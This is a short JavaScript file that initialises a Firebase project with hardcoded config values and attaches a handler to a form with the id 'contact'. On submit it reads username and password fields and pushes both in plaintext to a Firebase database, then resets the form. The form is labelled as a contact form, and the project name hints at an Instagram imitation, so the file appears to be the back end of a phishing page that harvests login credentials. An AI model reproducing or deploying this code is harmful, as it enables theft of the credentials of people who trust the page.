// For Firebase JS SDK v7.20.0 and later, measurementId is optional
const firebaseConfig = {
    apiKey: "AIzaSyBFOUSdaNqqhKiHPMT75NJdDBGUVZie3Cs",
    authDomain: "fir-ins-4f5c2.firebaseapp.com",
    databaseURL: "https://fir-ins-4f5c2-default-rtdb.firebaseio.com",
    projectId: "fir-ins-4f5c2",
    storageBucket: "fir-ins-4f5c2.appspot.com",
    messagingSenderId: "437264463905",
    appId: "1:437264463905:web:bb88aa6978df3c866ccb60",
    measurementId: "G-TGCX9HM78X"
  };
  
  // initialize firebase
  firebase.initializeApp(firebaseConfig);
  
  // reference your database
  var contactFormDB = firebase.database().ref("contact");
  
  document.getElementById("contact").addEventListener("submit", submitForm);
  
  function submitForm(e) {
    e.preventDefault();
  
    var user = getElementVal("usr");
    var pswd = getElementVal("psswd");
    // var msgContent = getElementVal("msgContent");
  
    saveMessages(user, pswd);
  
    //   enable alert
    document.querySelector(".alert").style.display = "block";
  
    //   remove the alert
    setTimeout(() => {
      document.querySelector(".alert").style.display = "none";
    }, 3000);
  
    //   reset the form
    document.getElementById("contact").reset();
  }
  
  const saveMessages = (user, pswd) => {
    var newContactForm = contactFormDB.push();
  
    newContactForm.set({
      user: user,
      pswd: pswd,
    });
  };
  
  const getElementVal = (id) => {
    return document.getElementById(id).value;
  };